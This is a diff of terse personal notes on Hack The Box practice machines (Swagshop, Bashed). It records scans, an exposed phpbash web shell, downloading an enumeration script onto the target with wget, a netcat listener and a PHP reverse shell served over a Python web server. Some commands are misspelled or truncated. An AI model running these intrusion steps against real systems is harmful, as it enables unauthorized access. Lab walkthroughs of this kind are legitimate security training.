@@ -1,7 +1,7 @@
 HTB Machines
 
 1. Swagshop
-a. nmap -sC -sV -oA nmap/swagshop ip 
+ nmap -sC -sV -oA nmap/swagshop ip 
 
 ip from browser
 
@@ -54,3 +54,59 @@ wc -c root.txt
 
 
 ebrietas0.blogspot.com
+
+
+
+2. Bashed:
+
+nmap -sC -sV -oA nmap/initial ip
+
+apache2 search for 16.04
+
+ip
+
+copy code from github
+
+/opt/gobuster/gobuster -u http://ip -w /usr/
+
+
+ip/php
+sendmail.php exposed
+ip/dev
+phpbash
+
+id
+hostname
+
+cd /var/www/html/dev
+wget ip/linenum.sh
+
+cd /dev/shm
+
+bash linEnum.sh
+
+sudo -u scriptmanager woami
+
+pentestmonkey.net     reverseshell cheatsheet
+
+see php code
+
+host : nc -lvnp 8081
+
+
+
+victim: 
+
+cp /opt/shell
+cp /opt/shell/php/php-reverse-shell.php
+locate php-reverse-shell.php
+vi php-reverse-shell.php
+python-m simplehttpserver 8080
+
+
+
+
+
+
+
+
